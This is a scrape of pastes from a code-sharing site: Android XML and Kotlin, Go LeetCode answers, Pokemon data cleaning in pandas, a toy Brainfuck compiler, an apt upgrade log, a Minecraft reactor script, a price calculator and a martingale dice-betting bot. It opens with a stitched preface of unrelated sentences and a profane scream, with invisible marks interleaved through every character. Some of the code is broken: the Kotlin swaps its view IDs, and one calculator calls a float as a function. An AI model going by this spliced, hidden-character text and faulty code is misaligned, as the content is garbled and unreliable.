U‎l‎t‎i‎m‎a‎t‎e‎l‎y‎,‎ ‎t‎h‎i‎s‎ ‎i‎s‎ ‎g‎o‎i‎n‎g‎ ‎t‎o‎ ‎h‎a‎v‎e‎ ‎t‎o‎ ‎b‎e‎ ‎s‎o‎l‎v‎e‎d‎ ‎s‎o‎m‎e‎h‎o‎w‎.‎ ‎B‎u‎t‎ ‎a‎t‎ ‎t‎h‎i‎s‎ ‎p‎o‎i‎n‎t‎,‎ ‎i‎t‎ ‎a‎p‎p‎e‎a‎r‎s‎ ‎t‎h‎a‎t‎ ‎I‎s‎r‎a‎e‎l‎ ‎i‎s‎ ‎g‎o‎i‎n‎g‎ ‎t‎o‎ ‎k‎i‎c‎k‎ ‎t‎h‎e‎ ‎c‎a‎n‎ ‎o‎n‎e‎ ‎l‎a‎s‎t‎ ‎t‎i‎m‎e‎.‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

H‎e‎l‎i‎c‎o‎n‎i‎u‎s‎ ‎c‎h‎a‎r‎i‎t‎h‎o‎n‎i‎a‎,‎ ‎c‎o‎m‎m‎o‎n‎l‎y‎ ‎k‎n‎o‎w‎n‎ ‎a‎s‎ ‎t‎h‎e‎ ‎z‎e‎b‎r‎a‎ ‎l‎o‎n‎g‎w‎i‎n‎g‎ ‎o‎r‎ ‎z‎e‎b‎r‎a‎ ‎h‎e‎l‎i‎c‎o‎n‎i‎a‎n‎,‎ ‎i‎s‎ ‎a‎ ‎s‎p‎e‎c‎i‎e‎s‎ ‎o‎f‎ ‎b‎u‎t‎t‎e‎r‎f‎l‎y‎ ‎b‎e‎l‎o‎n‎g‎i‎n‎g‎ ‎t‎o‎ ‎t‎h‎e‎ ‎f‎a‎m‎i‎l‎y‎ ‎N‎y‎m‎p‎h‎a‎l‎i‎d‎a‎e‎.‎ ‎I‎t‎ ‎i‎s‎ ‎d‎i‎s‎t‎r‎i‎b‎u‎t‎e‎d‎ ‎a‎c‎r‎o‎s‎s‎ ‎S‎o‎u‎t‎h‎ ‎a‎n‎d‎ ‎C‎e‎n‎t‎r‎a‎l‎ ‎A‎m‎e‎r‎i‎c‎a‎ ‎a‎n‎d‎ ‎t‎h‎e‎ ‎U‎.‎S‎.‎ ‎s‎t‎a‎t‎e‎s‎ ‎o‎f‎ ‎T‎e‎x‎a‎s‎ ‎a‎n‎d‎ ‎F‎l‎o‎r‎i‎d‎a‎,‎ ‎w‎i‎t‎h‎ ‎s‎o‎m‎e‎ ‎m‎i‎g‎r‎a‎t‎i‎o‎n‎s‎ ‎f‎u‎r‎t‎h‎e‎r‎ ‎n‎o‎r‎t‎h‎ ‎i‎n‎ ‎t‎h‎e‎ ‎w‎a‎r‎m‎e‎r‎ ‎m‎o‎n‎t‎h‎s‎.‎ ‎A‎d‎u‎l‎t‎ ‎b‎u‎t‎t‎e‎r‎f‎l‎i‎e‎s‎ ‎a‎r‎e‎ ‎m‎o‎n‎o‎m‎o‎r‎p‎h‎i‎c‎ ‎o‎f‎ ‎m‎e‎d‎i‎u‎m‎ ‎s‎i‎z‎e‎ ‎w‎i‎t‎h‎ ‎l‎o‎n‎g‎ ‎w‎i‎n‎g‎s‎.‎ ‎O‎n‎ ‎t‎h‎e‎ ‎d‎o‎r‎s‎a‎l‎ ‎s‎i‎d‎e‎,‎ ‎t‎h‎e‎ ‎w‎i‎n‎g‎s‎ ‎a‎r‎e‎ ‎b‎l‎a‎c‎k‎ ‎w‎i‎t‎h‎ ‎n‎a‎r‎r‎o‎w‎ ‎w‎h‎i‎t‎e‎ ‎a‎n‎d‎ ‎y‎e‎l‎l‎o‎w‎ ‎s‎t‎r‎i‎p‎e‎s‎,‎ ‎w‎i‎t‎h‎ ‎a‎ ‎s‎i‎m‎i‎l‎a‎r‎ ‎p‎a‎t‎t‎e‎r‎n‎ ‎o‎n‎ ‎t‎h‎e‎ ‎v‎e‎n‎t‎r‎a‎l‎ ‎s‎i‎d‎e‎,‎ ‎b‎u‎t‎ ‎p‎a‎l‎e‎r‎ ‎a‎n‎d‎ ‎w‎i‎t‎h‎ ‎r‎e‎d‎ ‎s‎p‎o‎t‎s‎.‎ ‎T‎h‎e‎ ‎w‎i‎n‎g‎s‎p‎a‎n‎ ‎r‎a‎n‎g‎e‎s‎ ‎f‎r‎o‎m‎ ‎7‎2‎ ‎t‎o‎ ‎1‎0‎0‎ ‎m‎m‎ ‎(‎2‎.‎8‎ ‎t‎o‎ ‎3‎.‎9‎ ‎i‎n‎)‎.‎ ‎T‎h‎e‎ ‎c‎a‎t‎e‎r‎p‎i‎l‎l‎a‎r‎s‎ ‎a‎r‎e‎ ‎w‎h‎i‎t‎e‎ ‎w‎i‎t‎h‎ ‎b‎l‎a‎c‎k‎ ‎s‎p‎o‎t‎s‎ ‎a‎n‎d‎ ‎h‎a‎v‎e‎ ‎n‎u‎m‎e‎r‎o‎u‎s‎ ‎b‎l‎a‎c‎k‎ ‎s‎p‎i‎k‎e‎s‎ ‎a‎l‎o‎n‎g‎ ‎t‎h‎e‎i‎r‎ ‎b‎o‎d‎y‎.‎ ‎A‎d‎u‎l‎t‎s‎ ‎r‎o‎o‎s‎t‎ ‎i‎n‎ ‎g‎r‎o‎u‎p‎s‎ ‎o‎f‎ ‎u‎p‎ ‎t‎o‎ ‎6‎0‎ ‎i‎n‎d‎i‎v‎i‎d‎u‎a‎l‎s‎ ‎o‎n‎ ‎a‎ ‎n‎i‎g‎h‎t‎l‎y‎ ‎b‎a‎s‎i‎s‎,‎ ‎r‎e‎t‎u‎r‎n‎i‎n‎g‎ ‎t‎o‎ ‎t‎h‎e‎ ‎s‎a‎m‎e‎ ‎r‎o‎o‎s‎t‎ ‎e‎v‎e‎r‎y‎ ‎n‎i‎g‎h‎t‎.‎ ‎T‎h‎e‎s‎e‎ ‎r‎o‎o‎s‎t‎s‎ ‎p‎r‎o‎v‎i‎d‎e‎ ‎p‎r‎o‎t‎e‎c‎t‎i‎o‎n‎ ‎t‎o‎ ‎a‎d‎u‎l‎t‎s‎,‎ ‎t‎h‎e‎ ‎l‎a‎r‎g‎e‎ ‎g‎r‎o‎u‎p‎s‎ ‎d‎e‎t‎e‎r‎r‎i‎n‎g‎ ‎p‎r‎e‎d‎a‎t‎o‎r‎s‎ ‎a‎n‎d‎ ‎r‎e‎t‎a‎i‎n‎i‎n‎g‎ ‎w‎a‎r‎m‎t‎h‎.‎ ‎T‎h‎i‎s‎ ‎H‎.‎ ‎c‎h‎a‎r‎i‎t‎h‎o‎n‎i‎a‎ ‎b‎u‎t‎t‎e‎r‎f‎l‎y‎ ‎w‎a‎s‎ ‎p‎h‎o‎t‎o‎g‎r‎a‎p‎h‎e‎d‎ ‎i‎n‎ ‎H‎e‎n‎d‎r‎y‎ ‎C‎o‎u‎n‎t‎y‎,‎ ‎F‎l‎o‎r‎i‎d‎a‎.‎

P‎h‎o‎t‎o‎g‎r‎a‎p‎h‎ ‎c‎r‎e‎d‎i‎t‎:‎ ‎N‎o‎s‎f‎e‎r‎a‎t‎t‎u‎s‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

B‎y‎e‎,‎ ‎g‎u‎y‎s‎.‎ ‎I‎'‎m‎ ‎g‎o‎n‎n‎a‎ ‎g‎o‎ ‎a‎a‎a‎a‎a‎a‎a‎a‎a‎a‎a‎a‎a‎a‎a‎a‎a‎a‎a‎a‎a‎a‎a‎a‎a‎a‎a‎a‎a‎a‎a‎a‎a‎a‎a‎a‎a‎a‎a‎a‎a‎a‎a‎a‎a‎a‎a‎a‎a‎a‎a‎a‎a‎a‎a‎a‎a‎a‎a‎a‎a‎a‎a‎a‎a‎a‎a‎a‎a‎a‎a‎a‎a‎a‎a‎a‎a‎a‎A‎A‎A‎A‎A‎A‎A‎A‎A‎A‎A‎A‎A‎A‎A‎A‎A‎A‎A‎H‎H‎H‎H‎H‎H‎H‎H‎H‎H‎H‎H‎H‎H‎H‎H‎H‎H‎H‎!‎ ‎F‎U‎C‎K‎!‎ ‎A‎F‎T‎E‎R‎S‎H‎A‎V‎E‎ ‎"
FCLWsq5V,strings.xml,Diaxon,XML,Sunday 22nd of October 2023 08:40:22 AM CDT,"<resources>
    <string name=""app_name"">zadanie8_1</string>
    <plurals name=""plurals"">
        <item quantity=""zero"">0? to za mało</item>
        <item quantity=""few"">$d? To już prawie wystarczająco </item>
        <item quantity=""many"">$d? Wystarczająco</item>
    </plurals>
</resources>
"
ka4FQFde,activity_main.xml,Diaxon,XML,Sunday 22nd of October 2023 08:40:03 AM CDT,"<?xml version=""1.0"" encoding=""utf-8""?>
<androidx.constraintlayout.widget.ConstraintLayout
    xmlns:android=""http://schemas.android.com/apk/res/android""
    xmlns:tools=""http://schemas.android.com/tools""
    xmlns:app=""http://schemas.android.com/apk/res-auto""
    android:layout_width=""match_parent""
    android:layout_height=""match_parent""
    tools:context="".MainActivity"">


    <TextView
        android:id=""@+id/textView""
        android:layout_width=""wrap_content""
        android:layout_height=""wrap_content""
        android:text=""TextView""
        tools:layout_editor_absoluteX=""143dp""
        tools:layout_editor_absoluteY=""269dp"" />

    <EditText
        android:id=""@+id/editTextNumber""
        android:layout_width=""wrap_content""
        android:layout_height=""wrap_content""
        android:ems=""10""
        android:inputType=""number""
        tools:layout_editor_absoluteX=""46dp""
        tools:layout_editor_absoluteY=""136dp"" />
</androidx.constraintlayout.widget.ConstraintLayout>"
iJPRZWdc,Main.kt,Diaxon,Kotlin,Sunday 22nd of October 2023 08:39:34 AM CDT,"package com.example.zadanie8_1

import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.widget.EditText
import android.widget.TextView

class MainActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        val text = findViewById<EditText>(R.id.textView).text.toString()
        val textView = findViewById<TextView>(R.id.editTextNumber)

        textView.text = resources.getQuantityString(R.plurals.plurals, text.toInt(), text.toInt())
               

    }
}"
0RX4xdBz,Untitled,lazar955,Go,Sunday 22nd of October 2023 08:38:20 AM CDT,"func longestConsecutive(nums []int) int {
    numSet:=map[int]bool{}
    for _,v:=range nums {
        numSet[v] = true
    }
    longest := 0

   for num:=range numSet {
       if numSet[num - 1] {
           continue
       }
       cur :=num
       for numSet[cur+1] {
           cur++
       }
       longest = max(longest,cur - num + 1)
   }
    return longest
}
func max(a, b int)int{
    if a > b{
        return a
    }
    return b
}"
fp1X6kd8,extractClassifications,Ordiance,Python,Sunday 22nd of October 2023 08:37:17 AM CDT,"import pandas as pd
import numpy as np

pokemonTable = pd.read_csv(""dataClean/Pokemon.csv"")

# Get a list of all unique values in the classification-column and sort it alphabetically
classificationList = pokemonTable.classification.unique()
classificationList = np.sort(classificationList)

# Build a dictionary from the list, mapping the name to the corresponding index
classificationDict = {name: index for index, name in enumerate(classificationList)}

# Translate all names into numerical values using the created dictionary
pokemonTable.classification = pokemonTable.classification.map(lambda x: classificationDict[x])

# Create new table with all index <-> name mappings
classificationTable = pd.DataFrame(classificationDict.keys(), columns=[""name""])
# Cleanup name of row 331 because it contains a weird value ._.
classificationTable.name.iloc[331] = ""Mischief Pokémon""

# Replace every é with e because special character encoding in mySQL is hell ._.
classificationTable.name.replace(""é"", ""e"", regex=True, inplace=True)

classificationTable.to_csv(""dataClean/Classifications.csv"", encoding=""utf-8"")
pokemonTable.to_csv(""dataClean/Pokemon.csv"")"
xQxJ8RAr,cleanPokemonTable,Ordiance,Python,Sunday 22nd of October 2023 08:12:46 AM CDT,"import pandas as pd
import numpy as np

pokemonTable = pd.read_csv(""dataRaw/pokemonRaw.csv"")

pokemonTable = pokemonTable.drop(columns= ['against_bug', 'against_dark', 'against_dragon', 'against_electric',
                    'against_fairy', 'against_fight', 'against_fire', 'against_fire', 'against_flying',
                    'against_ghost', 'against_grass', 'against_ground', 'against_ground', 'against_ice',
                    'against_normal', 'against_poison', 'against_psychic', 'against_rock', 'against_steel',
                    'against_water', 'base_egg_steps', 'base_happiness','base_total', 'capture_rate',
                     'experience_growth', 'height_m', 'percentage_male', 'pokedex_number'])

# From japanese_name column, extracts alphabetic characters into romanji column
pokemonTable['romanji'] = pokemonTable['japanese_name'].str.extract(f'([A-Za-z]+)')

# Fill empty cells in weight_kg column with 0 values
pokemonTable.weight_kg.fillna(0, inplace=True)



# Establish connection between abilities column and Abilities.csv

abilityTable = pd.read_csv(""dataClean/Abilities.csv"")

# Per row, replaces string storing all abilities into a list storing all abilities
pokemonTable.abilities = pokemonTable.abilities.str.findall(pat=""'([^']+)'"")

# Creates a dictionary mapping the ability name to the index found in the Abilities.csv
abilityIndexDict = dict()
for index, ability in enumerate(abilityTable.Name):
    # Remove spaces and capitalization to unify data
    ability = ability.replace("" "", """").lower()
    abilityIndexDict[ability] = index


# Since there is a m:n relationship between Pokemon and Abilities, create a new table mapping every PokemonId to their corresponding AbilityIds
pokemonAbilitiesTable = []

# Iterate through abilities column per Pokemon
for i, abilities in enumerate(pokemonTable.abilities):
    # Iterate through all possible abilities of one Pokemon
    for ability in abilities:
        # Translate abilityName to abilityIndex via abilityIndexDict
        abilityIndex = abilityIndexDict[ability.replace("" "", """").lower()]
        pokemonAbilitiesTable.append((i, abilityIndex))

# Create pokemonAbilitiesTable and store it as a separate CSV
pokemonAbilitiesTable = pd.DataFrame(pokemonAbilitiesTable, columns=[""PokemonId"", ""AbilityId""])
pokemonAbilitiesTable.to_csv(""dataClean/PokemonAbilitiesTable.csv"")

# Drop abilities column since mapping has been extracted to separate PokemonAbilitiesTable
pokemonTable.drop(""abilities"", axis=1, inplace=True)

pokemonTable = pokemonTable.drop(columns=['japanese_name'])




# Move name-column to the start of the table
col = pokemonTable.pop(""name"")
pokemonTable.insert(0, col.name, col)

# Reorganize colummn order
pokemonTable.rename({""classfication"": ""classification""}, axis=1, inplace=True)
pokemonTable = pokemonTable[['name', 'romanji', 'type1', 'type2', 'classification', 'attack',
'defense', 'hp','sp_attack','sp_defense','speed','weight_kg','generation','is_legendary']]



pokemonTable.to_csv('dataClean/Pokemon.csv', index=False)


"
wGQeV1VJ,Untitled,lazar955,Go,Sunday 22nd of October 2023 08:02:54 AM CDT,"func productExceptSelf(nums []int) []int {
    res:=make([]int,len(nums))

    prefix:=1
    for i:= range nums {
        res[i] = prefix
        prefix *=nums[i]
    }
    postfix:=1
    for i:=len(nums) -1;i>=0;i-- {
        res[i] *=postfix
        postfix *=nums[i]
    }
    return res
}"
wrEq9PEm,Team Lineup,stiky_fingaz,Python,Sunday 22nd of October 2023 07:42:29 AM CDT,"from collections import defaultdict


def player_sort(*args):
    teams = defaultdict(list)
    for player in args:
        teams[player[1]].append(player[0])

    sorted_teams = sorted(teams.items(), key=lambda team: len(team[1]))[-1::-1]

    return sorted_teams


if __name__ == '__main__':
    print(player_sort(
        (""Lionel Messi"", ""Argentina""),
        (""Neymar"", ""Brazil""),
        (""Cristiano Ronaldo"", ""Portugal""),
        (""Harry Kane"", ""England""),
        (""Kylian Mbappe"", ""France""),
        (""Raheem Sterling"", ""England"")
    ))
"
KUXkCpMv,Nightly Brainfuck Compiler 1.2,LemonCoder,Python,Sunday 22nd of October 2023 07:31:36 AM CDT,"import sys
Args = sys.argv
f = open(Args[1])

#Nodet (Nightly) 1.2bfc ---> to Brainf**k compiler

#Switchers
compiling_process = True
compiled_code = """"
current_pos = 0 #0 cell for echo
functions = {}
f_dump_c_end = False
#
print(""\n "" * 100)


while compiling_process:
    current_line = f.readline()
    if ""echo"" in current_line:
        if current_pos == 0:
            pass
        else:
            compiled_code += ""<"" * current_pos
        printed_text = current_line[current_line.index(""echo"")+5:]
        for x in range(len(printed_text)):
            compiled_code += ""+"" * ord(printed_text[x]) + "".""
            compiled_code += ""[-]""
        compiled_code += "">"" * current_pos
    elif ""move_r!"" in current_line:
        compiled_code += "">""
        current_pos += 1

    elif ""move_l!"" in current_line:
        compiled_code += ""<""
        current_pos -= 1

    elif ""movec_l"" in current_line:
        current_pos -= int(current_line[current_line.index(""movec_l"")+8:])
        compiled_code += int(current_line[current_line.index(""movec_l"")+8:]) * ""<""
    elif ""movec_r"" in current_line:
        current_pos += int(current_line[current_line.index(""movec_r"")+8:])
        compiled_code += int(current_line[current_line.index(""movec_r"")+8:]) * "">""
    
    elif ""zero!"" in current_line:
        compiled_code += ""[-]""

    elif ""add"" in current_line:
        compiled_code += int(current_line[current_line.index(""add"")+4:]) * ""+""
    
    elif ""minus"" in current_line:
        compiled_code += int(current_line[current_line.index(""minus"")+6:]) * ""-""

    elif ""$"" in current_line:
        pass

    elif ""bf_code"" in current_line:
        compiled_code += current_line[current_line.index(""bf_code"")+8:]

    elif ""def_func"" in current_line:
        current_line_temp = current_line.split()
        functions[current_line_temp[1]] = current_line_temp[2]

    elif ""func_call"" in current_line:
        current_line_temp = current_line.split()
        compiled_code += functions[current_line_temp[1]]

    elif ""func_dump_c_end!"" in current_line:
        f_dump_c_end = True

    if not current_line:
        break
print(""- - - - - - - - - - - - - - - -Compiled code!- - - - - - - - - - - - - - - - "")
print(compiled_code)
print(""- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -"")
if f_dump_c_end == True:
    print(functions)
    print(""- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -"")
print(""Program compiled"")"
pYx9zDZY,Untitled,lazar955,Go,Sunday 22nd of October 2023 07:27:31 AM CDT,"func groupAnagrams(strs []string) [][]string {
    res:=map[[26]int][]string{}

    for _,s:=range strs {
        count:=[26]int{}

        for _,c:=range s{
            count[c-'a'] +=1
        }
        res[count]=append(res[count],s)
    }

    frs:=[][]string{}
    for _,v:=range res {
        frs = append(frs,v)
    }
    return frs
}"
Cci47pj7,Offroad,stiky_fingaz,Python,Sunday 22nd of October 2023 06:35:51 AM CDT,"fuel_points = [int(x) for x in input().split()]
fuel_points_reversed = fuel_points[-1::-1]
additional_cost = [int(x) for x in input().split()]
milestones = [int(x) for x in input().split()]

for i in range(4):
    current_point = fuel_points_reversed[i] - additional_cost[i] - milestones[i]
    if current_point < 0:
        print(f'John did not reach: Altitude {i + 1}')
        print(""John failed to reach the top."")

        if i == 0:
            print(""John didn't reach any altitude."")
            break
        altitudes = [f'Altitude {x + 1}' for x in range(i)]
        print(f""Reached altitudes: {', '.join(altitudes)}"")
        break
    print(f'John has reached: Altitude {i + 1}')
    if i == 3:
        print('John has reached all the altitudes and managed to reach the top!')
"
h0S0PKvW,Singularity updates,IgorLytkin,Bash,Sunday 22nd of October 2023 06:21:41 AM CDT,"Using username ""liv"".
Authenticating with public key ""igorl@igor2022"" from agent
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-87-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Oct 22 06:18:22 PM +07 2023

  System load:  0.0                Processes:             241
  Usage of /:   74.2% of 28.89GB   Users logged in:       0
  Memory usage: 32%                IPv4 address for eth0: 62.113.107.38
  Swap usage:   0%                 IPv4 address for eth1: 10.16.0.1

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

 * Introducing Expanded Security Maintenance for Applications.
   Receive updates to over 25,000 software packages with your
   Ubuntu Pro subscription. Free for personal use.

     https://ubuntu.com/pro

Expanded Security Maintenance for Applications is not enabled.

1 update can be applied immediately.
To see these additional updates run: apt list --upgradable

19 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm

New release '23.04' available.
Run 'do-release-upgrade' to upgrade to it.


Last login: Fri Oct 20 11:24:22 2023 from 127.0.0.1
liv@singularity:~$ sudo apt update
[sudo] password for liv:
Get:1 http://security.ubuntu.com/ubuntu jammy-security InRelease [110 kB]
Hit:2 https://dl.google.com/linux/chrome/deb stable InRelease
Hit:3 http://apt.postgresql.org/pub/repos/apt jammy-pgdg InRelease
Get:4 https://repo.zabbix.com/zabbix-agent2-plugins/1/ubuntu jammy InRelease [4,952 B]
Get:5 http://security.ubuntu.com/ubuntu jammy-security/main amd64 DEP-11 Metadata [43.1 kB]
Get:6 http://security.ubuntu.com/ubuntu jammy-security/universe amd64 DEP-11 Metadata [55.1 kB]
Hit:7 http://archive.ubuntu.com/ubuntu jammy InRelease
Get:8 http://archive.ubuntu.com/ubuntu jammy-updates InRelease [119 kB]
Get:9 http://archive.ubuntu.com/ubuntu jammy-backports InRelease [109 kB]
Get:10 http://archive.ubuntu.com/ubuntu jammy-updates/main amd64 DEP-11 Metadata [101 kB]
Get:11 http://archive.ubuntu.com/ubuntu jammy-updates/restricted amd64 Packages [1,036 kB]
Get:12 http://archive.ubuntu.com/ubuntu jammy-updates/universe amd64 DEP-11 Metadata [305 kB]
Get:13 http://archive.ubuntu.com/ubuntu jammy-updates/multiverse amd64 DEP-11 Metadata [940 B]
Get:14 http://archive.ubuntu.com/ubuntu jammy-backports/main amd64 DEP-11 Metadata [4,920 B]
Get:15 http://archive.ubuntu.com/ubuntu jammy-backports/universe amd64 DEP-11 Metadata [17.7 kB]
Fetched 1,906 kB in 3s (637 kB/s)
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
3 packages can be upgraded. Run 'apt list --upgradable' to see them.
liv@singularity:~$ sudo apt list --upgradable
Listing... Done
gjs/jammy-updates 1.72.4-0ubuntu0.22.04.1 amd64 [upgradable from: 1.72.2-0ubuntu2]
libgjs0g/jammy-updates 1.72.4-0ubuntu0.22.04.1 amd64 [upgradable from: 1.72.2-0ubuntu2]
sosreport/jammy-updates 4.5.6-0ubuntu1~22.04.2 amd64 [upgradable from: 4.4-1ubuntu1.22.04.1]
liv@singularity:~$ sudo apt upgrade
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
Calculating upgrade... Done
Get more security updates through Ubuntu Pro with 'esm-apps' enabled:
  python2.7-minimal exo-utils libopenexr25 libpostproc55
  libmagickcore-6.q16-6-extra libavcodec58 libmagickwand-6.q16-6 libavutil56
  libswscale5 libmagickcore-6.q16-6 libexo-2-0 libswresample3
  imagemagick-6-common libavformat58 python2.7 libpython2.7-minimal
  libpython2.7-stdlib libexo-common libavfilter7
Learn more about Ubuntu Pro at https://ubuntu.com/pro
#
# Canonical released microcode updates for both Intel (CVE-2022-40982) and AMD
# (CVE-2023-20593). ‘Unattended upgrades’ provide security updates by default.
# Ensure it remains enabled to always get all updates as they become available.
#
The following packages have been kept back:
  gjs libgjs0g
The following packages will be upgraded:
  sosreport
1 upgraded, 0 newly installed, 0 to remove and 2 not upgraded.
Need to get 332 kB of archives.
After this operation, 840 kB disk space will be freed.
Do you want to continue? [Y/n] y
Get:1 http://archive.ubuntu.com/ubuntu jammy-updates/main amd64 sosreport amd64 4.5.6-0ubuntu1~22.04.2 [332 kB]
Fetched 332 kB in 1s (363 kB/s)
(Reading database ... 305447 files and directories currently installed.)
Preparing to unpack .../sosreport_4.5.6-0ubuntu1~22.04.2_amd64.deb ...
Unpacking sosreport (4.5.6-0ubuntu1~22.04.2) over (4.4-1ubuntu1.22.04.1) ...
Setting up sosreport (4.5.6-0ubuntu1~22.04.2) ...
Processing triggers for man-db (2.10.2-1) ...
Scanning processes...
Scanning linux images...

Running kernel seems to be up-to-date.

No services need to be restarted.

No containers need to be restarted.

No user sessions are running outdated binaries.

No VM guests are running outdated hypervisor (qemu) binaries on this host.
liv@singularity:~$ sudo apt update
Hit:1 https://dl.google.com/linux/chrome/deb stable InRelease
Hit:2 http://apt.postgresql.org/pub/repos/apt jammy-pgdg InRelease
Hit:3 http://archive.ubuntu.com/ubuntu jammy InRelease
Hit:4 http://security.ubuntu.com/ubuntu jammy-security InRelease
Hit:5 http://archive.ubuntu.com/ubuntu jammy-updates InRelease
Hit:6 http://archive.ubuntu.com/ubuntu jammy-backports InRelease
Get:7 https://repo.zabbix.com/zabbix-agent2-plugins/1/ubuntu jammy InRelease [4,952 B]
Fetched 4,952 B in 1s (5,257 B/s)
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
2 packages can be upgraded. Run 'apt list --upgradable' to see them.
liv@singularity:~$ sudo apt list --upgradable
Listing... Done
gjs/jammy-updates 1.72.4-0ubuntu0.22.04.1 amd64 [upgradable from: 1.72.2-0ubuntu2]
libgjs0g/jammy-updates 1.72.4-0ubuntu0.22.04.1 amd64 [upgradable from: 1.72.2-0ubuntu2]
liv@singularity:~$ sudo apt upgrade
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
Calculating upgrade... Done
Get more security updates through Ubuntu Pro with 'esm-apps' enabled:
  python2.7-minimal exo-utils libopenexr25 libpostproc55
  libmagickcore-6.q16-6-extra libavcodec58 libmagickwand-6.q16-6 libavutil56
  libswscale5 libmagickcore-6.q16-6 libexo-2-0 libswresample3
  imagemagick-6-common libavformat58 python2.7 libpython2.7-minimal
  libpython2.7-stdlib libexo-common libavfilter7
Learn more about Ubuntu Pro at https://ubuntu.com/pro
#
# Canonical released microcode updates for both Intel (CVE-2022-40982) and AMD
# (CVE-2023-20593). ‘Unattended upgrades’ provide security updates by default.
# Ensure it remains enabled to always get all updates as they become available.
#
The following packages have been kept back:
  gjs libgjs0g
0 upgraded, 0 newly installed, 0 to remove and 2 not upgraded.
liv@singularity:~$
"
J8XZxRNx,Untitled,jojoblack,Lua,Sunday 22nd of October 2023 06:20:50 AM CDT,"fission_reactor = peripheral.find(""fissionReactorLogicAdapter"")

local temp
local loop
local initial

fission_reactor.activate()
loop = true
initial = fission_reactor.getBurnRate()
temp = math.floor(fission_reactor.getTemperature())
shell.run('clear')
print(""Initial burnrate : "" .. initial)

os.sleep(1)
while loop do
	if math.floor(fission_reactor.getTemperature()) == temp or math.floor(fission_reactor.getTemperature()) == temp+1 or math.floor(fission_reactor.getTemperature()) == temp-1 then 
		shell.run('clear')
		temp = math.floor(fission_reactor.getTemperature())
		fission_reactor.setBurnRate(fission_reactor.getBurnRate()+1)
		print(""Burnrate Increased to : "" .. fission_reactor.getBurnRate())
		os.sleep(1)
	else
		shell.run('clear')
		loop = false
		fission_reactor.setBurnRate(fission_reactor.getBurnRate()-1)
		print('Burnrate set from : ' .. initial)
		print('To : ' .. fission_reactor.getBurnRate())
		fission_reactor.scram()
	end
end
"
dW8ZLPpp,Untitled,SaintMalthus,Python,Sunday 22nd of October 2023 06:19:24 AM CDT,"#Inputing Price per sheet
print(""Input price per sheet."")
price = float(input())

#Inputing Height
print(""Input your Height"")
height = float(input())

#Inputing Length
print(""Input your length"")
length = float(input())

#Calculating the price per cm3
total_Square_Footage = height*length
price_Per_cm3 = price / total_Square_Footage

#Message
print(""======================"")
print(str())

print(""!!!INCERTING THE CUT PIECE!!!"")

print(str())
print(""======================"")

#Inputing the cm3 for the cutted sheet

print(""Input your Height"")
height_Cut_Piece = float(input())

print(""Input your Length"")
length_Cut_Piece = float(input())

#Calculating the total square for cutted piece

total_Square_For_Cutted_Piece = height_Cut_Piece * length_Cut_Piece

#Calculating the price for the cutted piece

cutted_Piece_Price = total_Square_For_Cutted_Piece * price_Per_cm3

print(round(cutted_Piece_Price, 2))"
Hn1QAHFf,Untitled,SaintMalthus,Python,Sunday 22nd of October 2023 06:12:28 AM CDT,"#Inputing Price per sheet
print(""Input price per sheet."")
price = float(input())

#Inputing Height
print(""Input your Height"")
height = float(input())

#Inputing Length
print(""Input your length"")
length = float(input())

#Calculating the price per cm3
total_Square_Footage = height*length
price_Per_cm3 = price / total_Square_Footage

#Message
print(""======================"")
print(str())

price(""!!!INCERTING THE CUT PIECE!!!"")

print(""======================"")
print(str())

#Inputing the cm3 for the cutted sheet

print(""Input your Height"")
height_Cut_Piece = float(input())

print(""Input your Length"")
length_Cut_Piece = float(input())

#Calculating the total square for cutted piece

total_Square_For_Cutted_Piece = height_Cut_Piece * length_Cut_Piece

#Calculating the price for the cutted piece

cutted_Piece_Price = total_Square_For_Cutted_Piece * price_Per_cm3

print(cutted_Piece_Price)"
fv5UaafQ,snowybot,coinwalk,JavaScript,Sunday 22nd of October 2023 06:01:36 AM CDT,"var smiley = parseFloat(document.getElementById('pct_balance').value);
var nudie = Number((smiley/2400).toFixed(8));
var burp = nudie;
var taget = 1000;
var bolux = (nudie*10);
var poopy = (nudie*6.5);
var sexual = 0;
var splif = (nudie*24)
var jockey = ((burp*1).toFixed(8));
var bolance = smiley;
var cook = (smiley-splif);
var woman = smiley;
 
 
 
function get(){
console.clear();
bolance = document.getElementById('pct_balance').value;
bilance = ((document.getElementById('pct_balance').value)-cook);
if ((bolance>(((Math.floor(bolance/bolux))*bolux)+poopy))&&(bolance<(((Math.floor(bolance/bolux))*bolux)+(poopy+nudie)))&&(bolance!=sexual)){
    burp = burp*2;
    sexual = parseFloat(bolance);
}
if (((bilance-(burp*4))<=0)&&(bolance<(((Math.floor(bolance/bolux))*bolux)+poopy))&&(bolance>=woman)){
burp = nudie;
sexual = 0;
cook = ((parseFloat(bolance))-splif);
woman = parseFloat(bolance);
}
if (((bilance-(burp*4))<=0)&&(bolance<(((Math.floor(bolance/bolux))*bolux)+poopy))&&(bolance<woman)){
burp = nudie;
sexual = 0;
woman = parseFloat(bolance);
}
jockey = ((burp*1).toFixed(8));
$('#pct_chance').val(49.5);
$('#pct_bet').val(jockey);
$('#a_lo').click();
var dog = ((bolance-smiley).toFixed(8));
console.log(""profit"");
console.log(dog);
setTimeout(() => get(), 1000);
}
get();"
